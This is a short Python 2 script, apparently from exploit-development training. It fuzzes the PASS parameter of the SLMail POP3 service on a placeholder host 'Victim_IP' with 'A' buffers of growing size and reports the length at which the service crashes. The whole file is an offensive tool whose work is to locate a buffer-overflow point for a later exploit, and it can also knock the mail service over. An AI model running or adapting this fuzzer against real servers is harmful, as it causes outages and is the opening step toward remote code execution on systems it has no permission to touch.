#!/usr/bin/python
import socket
# Script for Fuzzing SLMail POP3 Service's PASS Parameter
counter = 100
while counter <= 3500:
        try:
                buffer = "A" * counter

                print "Fuzzing PASS with %s bytes" % len(buffer)

                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                connect=s.connect(('Victim_IP',110))
                s.recv(1024)

                s.send('USER test\r\n')
                s.recv(1024)

                s.send('PASS ' + buffer + '\r\n')

                s.send('QUIT\r\n')
                s.close()
                counter = counter + 200
        except socket.timeout:
                print "\nCrash Byte of PASS Parameter: %s" %  (len(buffer)-200)
                exit(0)
